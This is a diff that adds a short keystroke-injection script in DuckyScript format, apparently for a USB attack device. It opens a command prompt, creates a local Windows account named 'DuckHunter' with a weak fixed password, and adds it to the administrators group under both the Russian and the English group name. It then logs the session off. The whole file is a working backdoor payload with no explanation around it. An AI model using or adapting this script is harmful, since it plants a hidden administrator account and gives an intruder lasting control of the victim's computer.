@@ -1,0 +1,22 @@
+GUI s
+DELAY 700
+STRING cmd
+DELAY 700
+RIGHT
+DELAY 700
+DOWN
+DELAY 700
+ENTER
+DELAY 700
+STRING @echo off
+ENTER
+STRING cls
+ENTER
+STRING net user DuckHunter 1234567 /add
+ENTER
+STRING net localgroup Администраторы DuckHunter /add
+ENTER
+STRING net localgroup administrators DuckHunter /add
+ENTER
+STRING shutdown /l
+ENTER
